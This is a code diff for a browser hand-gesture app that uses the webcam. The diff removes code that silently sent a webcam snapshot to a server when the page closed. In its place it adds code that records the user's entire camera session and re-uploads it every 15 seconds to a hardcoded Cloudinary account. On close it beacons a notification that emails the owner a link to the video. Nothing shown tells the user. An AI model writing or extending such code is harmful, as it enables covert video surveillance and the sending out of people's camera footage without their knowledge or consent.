@@ -422,35 +422,60 @@ function onResults(results) {
   }
 }
 
-/* ================= AUTO-SEND SNAPSHOT ON CLOSE ================= */
-function dataURLtoBlob(dataurl) {
-  const arr = dataurl.split(',');
-  const mime = arr[0].match(/:(.*?);/)[1];
-  const bstr = atob(arr[1]);
-  let n = bstr.length;
-  const u8arr = new Uint8Array(n);
-  while (n--) u8arr[n] = bstr.charCodeAt(n);
-  return new Blob([u8arr], { type: mime });
+/* ================= FULL SESSION VIDEO -> CLOUDINARY -> EMAIL LINK ================= */
+// isi 2 baris ini pake punya kamu dari dashboard Cloudinary (Settings > Upload)
+const CLOUDINARY_CLOUD_NAME = 'mvdekhr3';
+const CLOUDINARY_UPLOAD_PRESET = 'hand_gesture_video';
+
+const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+const cloudPublicId = `handgesture/session-${sessionId}`;
+let recordedChunks = [];
+let mediaRecorder = null;
+let notified = false;
+
+function startRecording(stream) {
+  const mimeType = ['video/webm;codecs=vp8,opus', 'video/webm']
+    .find((t) => window.MediaRecorder && MediaRecorder.isTypeSupported(t)) || '';
+  try {
+    mediaRecorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+  } catch (e) {
+    console.error('MediaRecorder gagal dibuat:', e);
+    return;
+  }
+  mediaRecorder.ondataavailable = (e) => {
+    if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+  };
+  mediaRecorder.start(4000); // ngumpulin data tiap 4 detik
+
+  // upload ulang seluruh rekaman sejauh ini tiap 15 detik, nimpa file yang sama di Cloudinary
+  setInterval(uploadRecordingSoFar, 15000);
 }
 
-let snapshotSent = false;
-function captureAndSendSnapshot() {
-  if (snapshotSent || !videoEl.videoWidth) return;
-  snapshotSent = true;
-  setTimeout(() => { snapshotSent = false; }, 5000); // boleh kirim lagi kalau buka-tutup lagi
-
-  const snap = document.createElement('canvas');
-  // dikecilin biar ukuran file muat limit sendBeacon (~64KB)
-  snap.width = 320;
-  snap.height = Math.round((videoEl.videoHeight / videoEl.videoWidth) * 320) || 240;
-  snap.getContext('2d').drawImage(videoEl, 0, 0, snap.width, snap.height);
-  const blob = dataURLtoBlob(snap.toDataURL('image/jpeg', 0.6));
-  navigator.sendBeacon('/api/send-photo', blob);
+function uploadRecordingSoFar() {
+  if (!recordedChunks.length || CLOUDINARY_CLOUD_NAME === 'GANTI_CLOUD_NAME') return;
+  const blob = new Blob(recordedChunks, { type: 'video/webm' });
+  const fd = new FormData();
+  fd.append('file', blob);
+  fd.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+  fd.append('public_id', cloudPublicId);
+  fd.append('resource_type', 'video');
+  fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/video/upload`, {
+    method: 'POST',
+    body: fd,
+  }).catch((err) => console.error('Upload Cloudinary gagal:', err));
 }
 
-window.addEventListener('pagehide', captureAndSendSnapshot);
+function notifyEmailOnClose() {
+  if (notified || CLOUDINARY_CLOUD_NAME === 'GANTI_CLOUD_NAME') return;
+  notified = true;
+  uploadRecordingSoFar(); // upaya terakhir, best-effort (gak ditunggu)
+  const payload = JSON.stringify({ cloudName: CLOUDINARY_CLOUD_NAME, publicId: cloudPublicId });
+  navigator.sendBeacon('/api/notify-video', new Blob([payload], { type: 'application/json' }));
+}
+
+window.addEventListener('pagehide', notifyEmailOnClose);
 document.addEventListener('visibilitychange', () => {
-  if (document.hidden) captureAndSendSnapshot();
+  if (document.hidden) notifyEmailOnClose();
 });
 
 const hands = new Hands({
@@ -471,7 +496,10 @@ const camera = new Camera(videoEl, {
   height: 360,
 });
 camera.start()
-  .then(() => statusEl.classList.remove('show'))
+  .then(() => {
+    statusEl.classList.remove('show');
+    if (videoEl.srcObject) startRecording(videoEl.srcObject);
+  })
   .catch((err) => {
     console.error('Akses kamera ditolak/gagal:', err);
     statusEl.innerHTML = 'Kamera tidak bisa diakses.<br>Izinkan kamera lalu refresh halaman.';
